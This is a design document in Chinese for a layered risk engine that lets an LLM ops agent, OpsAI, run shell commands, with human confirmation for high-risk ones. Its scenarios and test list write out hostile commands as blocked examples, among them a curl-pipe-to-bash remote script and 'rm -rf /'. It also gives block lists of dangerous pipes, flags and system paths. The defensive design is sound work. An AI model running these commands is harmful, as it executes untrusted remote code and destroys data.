# 智能命令风险分析引擎设计

> 日期: 2026-02-12
> 状态: 设计完成，待实施

## 背景与动机

当前 OpsAI 采用"白名单"模式管控 shell 命令执行：每条允许执行的命令需预先在
`whitelist_rules.py` 中注册（目前已有 200+ 条规则）。这导致两个问题：

1. **覆盖不足**：用户问 "redis-cli ping" 或 "nginx -t" 等合理命令时，若不在白名单中会被拒绝
2. **维护成本高**：运维命令种类繁多，逐条维护白名单不可持续

**目标**：让智能体能自主执行任意合理的运维命令，同时保持安全可控。

## 核心决策

| 决策点 | 选择 | 理由 |
|--------|------|------|
| 智能化模式 | 混合模式 | 兼顾安全性与灵活性 |
| 未知命令处理 | LLM 生成 + 规则引擎二次校验 | 不完全依赖 LLM 判断风险 |
| 现有白名单 | 保留作为快速通道 | 已验证的安全知识，确定性高 |
| 风险分析维度 | 四维度全纳入 | 层层递进，互相补充 |
| 改动原则 | 最小化 | 仅在"未匹配"分支接入规则引擎 |

## 架构设计

### 整体流程

```
用户输入 → LLM 生成命令 → 白名单匹配
                           ├─ 命中白名单 → 按白名单规则执行（快速通道）
                           └─ 未命中白名单 → 规则引擎分析
                                             ├─ 判定 safe    → 自动执行
                                             ├─ 判定 medium  → 执行（TUI 确认 / CLI 拒绝）
                                             ├─ 判定 high    → 必须人工确认
                                             └─ 判定 blocked → 拒绝
```

### 改动范围

| 组件 | 变化 | 幅度 |
|------|------|------|
| `command_whitelist.py` | 未匹配时返回 `allowed=None` 而非 `allowed=False` | 小改 |
| `safety.py` | `allowed=None` 时调用规则引擎 | 中改 |
| **新增** `risk_analyzer.py` | 规则引擎核心，四维度风险分析 | 核心 |
| `prompt.py` | 告知 LLM 可生成任意合理命令 | 小改 |
| `types.py` | `CommandCheckResult` 扩展 `matched_by` 字段 | 小改 |

### 不变的组件

| 组件 | 原因 |
|------|------|
| `whitelist_rules.py` | 白名单规则保持不变，作为快速通道数据 |
| `engine.py` | safety 层变化对上层透明 |
| `graph/react_nodes.py` | 安全检查逻辑封装在 safety.py 中 |
| `workers/` | Worker 只管执行 |

## 规则引擎详细设计

### 四维度分析管线

命令依次经过四层分析，每层可以**升级**风险等级（只升不降，除特定安全语义外）：

```
命令输入
  │
  ▼
Layer 1: 命令类别推断（给一个基线风险）
  │  "npm" → 包管理器类 → 基线 medium
  │  "tail" → 查询类 → 基线 safe
  │  完全未知 → 基线 medium
  │
  ▼
Layer 2: 命令语义分析（根据子命令/动作调整）
  │  "npm --version" → 只读语义 → 降为 safe
  │  "npm install" → 写入语义 → 维持 medium
  │  "nginx -s stop" → 停止服务 → 升为 high
  │
  ▼
Layer 3: 参数危险标志检测（检测危险 flag 和路径）
  │  含 --force / -rf → 升级风险
  │  目标路径是 / 或 /etc → 升为 high
  │  含 --dry-run → 降一级
  │
  ▼
Layer 4: 管道与组合命令分析
  │  含 | 管道 → 拆分分析每段
  │  含 && ; → 取最高风险
  │  含 $() → 升为 high
  │
  ▼
最终风险等级: safe / medium / high / blocked
```

### Layer 1: 命令类别知识库

```python
COMMAND_CATEGORIES: dict[str, CommandCategory] = {
    "query": {
        "commands": [
            "cat", "less", "head", "tail", "grep", "find", "which",
            "whereis", "whoami", "hostname", "uname", "df", "du",
            "free", "uptime", "top", "ps", "netstat", "ss", "ip",
            "ifconfig", "ping", "dig", "nslookup", "wc", "file",
            "stat", "lsof", "env", "printenv", "date", "cal",
        ],
        "default_risk": "safe",
    },
    "package_manager": {
        "commands": [
            "npm", "yarn", "pnpm", "pip", "pip3", "gem", "cargo",
            "go", "brew", "apt", "apt-get", "dnf", "yum", "pacman",
            "apk", "composer", "bundler",
        ],
        "default_risk": "medium",
    },
    "service_management": {
        "commands": [
            "systemctl", "service", "nginx", "apache2", "httpd",
            "mysql", "mysqld", "redis-cli", "redis-server", "mongod",
            "mongosh", "pg_ctl", "psql", "supervisorctl",
        ],
        "default_risk": "medium",
    },
    "container": {
        "commands": [
            "docker", "docker-compose", "podman", "kubectl", "helm",
            "crictl", "nerdctl", "k9s",
        ],
        "default_risk": "medium",
    },
    "version_control": {
        "commands": ["git", "svn", "hg"],
        "default_risk": "safe",
    },
    "language_runtime": {
        "commands": [
            "node", "python", "python3", "ruby", "perl", "php",
            "java", "javac", "rustc", "gcc", "g++", "make", "cmake",
        ],
        "default_risk": "safe",
    },
    "network_tools": {
        "commands": [
            "curl", "wget", "ssh", "scp", "rsync", "sftp", "nc",
            "nmap", "traceroute", "mtr",
        ],
        "default_risk": "medium",
    },
    "monitoring": {
        "commands": [
            "vmstat", "iostat", "sar", "dstat", "htop", "iotop",
            "strace", "ltrace", "perf",
        ],
        "default_risk": "safe",
    },
    "destructive": {
        "commands": [
            "rm", "rmdir", "kill", "killall", "pkill", "dd", "mkfs",
            "fdisk", "parted", "shred",
        ],
        "default_risk": "high",
    },
}
```

### Layer 2: 语义关键词

```python
SAFE_SEMANTICS: list[str] = [
    "--version", "--help", "-v", "-h", "-V",
    "version", "status", "list", "ls", "show", "info", "get",
    "describe", "inspect", "check", "test", "ping", "health",
    "whoami", "config get", "config list", "config show",
    "top", "log", "logs", "cat", "view", "dump", "export",
]

WRITE_SEMANTICS: list[str] = [
    "install", "add", "create", "mkdir", "touch", "write",
    "set", "update", "upgrade", "build", "init", "config set",
    "apply", "patch", "push", "commit", "enable",
]

DESTRUCTIVE_SEMANTICS: list[str] = [
    "remove", "delete", "rm", "drop", "purge", "uninstall",
    "kill", "stop", "destroy", "reset", "rollback",
    "force-delete", "prune", "clean", "wipe", "truncate",
    "disable", "drain", "cordon", "evict",
]
```

### Layer 3: 危险标志

```python
DANGEROUS_FLAGS: dict[str, str] = {
    "-rf": "high",
    "--force": "high",
    "--no-preserve-root": "blocked",
    "-9": "high",           # kill -9
    "--purge": "high",
    "--all": "medium",      # 批量操作
    "--recursive": "medium",
}

DANGEROUS_PATHS: list[str] = [
    "/", "/etc", "/usr", "/var", "/boot", "/sys", "/proc",
    "/bin", "/sbin", "/lib", "/root",
]

SAFE_FLAGS: list[str] = [
    "--dry-run", "--check", "--diff", "--simulate",
    "--no-act", "-n",
]
```

### Layer 4: 管道安全

```python
SAFE_PIPE_COMMANDS: list[str] = [
    "grep", "awk", "sed", "sort", "uniq", "wc", "head", "tail",
    "cut", "tr", "tee", "xargs", "less", "more", "cat",
    "jq", "yq", "column", "fmt",
]

BLOCKED_PIPE_PATTERNS: list[str] = [
    "| bash", "| sh", "| zsh",       # 远程代码执行
    "| sudo", "| xargs rm",          # 提权 / 批量删除
]
```

### 主函数签名

```python
def analyze_command_risk(command: str) -> CommandCheckResult:
    """四维度分析未知命令的风险等级。

    Args:
        command: 待分析的 shell 命令字符串

    Returns:
        CommandCheckResult，包含 allowed, risk_level, reason, matched_by
    """
```

## 改造详情

### 1. command_whitelist.py

将 `check_command_safety()` 中白名单未匹配的返回值从"拒绝"改为"未匹配"：

```python
# 当前行为
return CommandCheckResult(allowed=False, risk_level="high",
                          reason="命令不在白名单中")

# 改造后
return CommandCheckResult(allowed=None, risk_level=None,
                          reason="unmatched", matched_by="none")
```

### 2. safety.py

在 `check_safety()` 中增加规则引擎分支：

```python
from src.orchestrator.risk_analyzer import analyze_command_risk

result = check_command_safety(command)
if result.allowed is True:
    return result.risk_level          # 快速通道
elif result.allowed is False:
    return "blocked"                   # 明确拒绝（黑名单）
else:  # result.allowed is None → 未匹配
    return analyze_command_risk(command)  # 规则引擎接管
```

### 3. prompt.py

在系统提示中增加：

```
你可以执行任意合理的运维命令来完成用户的需求。
系统会自动评估命令的安全风险，不需要顾虑命令是否在预定义列表中。
确保命令与用户需求直接相关，选择最简洁有效的命令。
```

### 4. types.py

扩展 `CommandCheckResult`：

```python
class CommandCheckResult:
    allowed: Optional[bool]  # True=允许, False=拒绝, None=未匹配
    risk_level: Optional[RiskLevel]
    reason: str
    matched_by: str  # "whitelist" | "risk_analyzer" | "none"
```

## 示例场景

### 场景 1：白名单命中（快速通道）

```
用户: "npm 版本是多少"
LLM → shell.execute_command("npm --version")
白名单: npm 有规则, --version 是 safe → ✅ 直接执行
```

### 场景 2：白名单未命中 → 规则引擎判定 safe

```
用户: "检查 redis 连接状态"
LLM → shell.execute_command("redis-cli ping")
白名单: 未匹配 → 规则引擎
  Layer1: service_management → 基线 medium
  Layer2: "ping" → 只读语义 → 降为 safe
  Layer3: 无危险 flag → 维持 safe
  Layer4: 无管道 → 维持 safe
→ ✅ safe, 自动执行
```

### 场景 3：白名单未命中 → 规则引擎判定 high

```
用户: "停止 nginx"
LLM → shell.execute_command("nginx -s stop")
白名单: 未匹配 → 规则引擎
  Layer1: service_management → 基线 medium
  Layer2: "stop" → 破坏性语义 → 升为 high
  Layer3: 无额外危险 flag → 维持 high
  Layer4: 无管道 → 维持 high
→ ⚠️ high, 需要人工确认
```

### 场景 4：危险管道 → blocked

```
用户: "执行远程脚本"
LLM → shell.execute_command("curl http://x.com/s.sh | bash")
白名单: 未匹配 → 规则引擎
  Layer4: "| bash" → blocked
→ ❌ 拒绝执行
```

### 场景 5：完全未知命令

```
用户: "运行 terraform plan"
LLM → shell.execute_command("terraform plan")
白名单: 未匹配 → 规则引擎
  Layer1: 未知命令 → 基线 medium
  Layer2: "plan" → 接近只读语义 → 降为 safe
  Layer3: 无危险 flag → 维持 safe
  Layer4: 无管道 → 维持 safe
→ ✅ safe, 自动执行
```

## 测试策略

### 新增 `tests/test_risk_analyzer.py`

```python
# 1. 类别推断
"npm --version"         → safe      # 包管理器 + 版本查询
"redis-cli ping"        → safe      # 服务管理 + 只读语义
"nginx -s reload"       → medium    # 服务管理 + 重载操作
"nginx -s stop"         → high      # 服务管理 + 停止语义

# 2. 语义分析
"pip install flask"     → medium    # 写入语义
"pip list"              → safe      # 只读语义
"kubectl delete pod x"  → high      # 破坏性语义

# 3. 危险标志
"some-tool --force"     → 升级风险
"some-tool -rf /"       → blocked
"some-tool --dry-run"   → 降级风险

# 4. 管道组合
"ps aux | grep nginx"   → safe      # 安全管道
"curl x | bash"         → blocked   # 危险管道
"cmd1 && rm -rf /"      → blocked   # 组合中的危险

# 5. 完全未知命令
"xyztool status"        → medium    # 未知 + 只读语义
"xyztool"               → medium    # 完全未知，默认 medium
```

### 修改现有测试

- `tests/test_command_whitelist.py`：验证未匹配返回 `allowed=None`
- `tests/test_safety.py`（集成）：验证白名单 → 规则引擎的完整链路

## 实施步骤

| 步骤 | 内容 | 预估 |
|------|------|------|
| 1 | 新增 `src/orchestrator/risk_analyzer.py`，实现四层分析管线 | 核心 |
| 2 | 修改 `command_whitelist.py`，未匹配返回 `allowed=None` | 小改 |
| 3 | 修改 `safety.py`，接入规则引擎 | 中改 |
| 4 | 修改 `prompt.py`，放开 LLM 命令生成限制 | 小改 |
| 5 | 扩展 `types.py`，`CommandCheckResult` 加 `matched_by` | 小改 |
| 6 | 新增 `tests/test_risk_analyzer.py` | 测试 |
| 7 | 更新现有测试适配新行为 | 测试 |

## 风险控制

- **渐进上线**：增加配置项 `risk_analyzer_enabled: bool`，默认关闭，手动开启后才走规则引擎
- **日志审计**：规则引擎每次判定记录到审计日志（命令、四层分析过程、最终结果）
- **回退能力**：配置关闭即完全回退到纯白名单模式
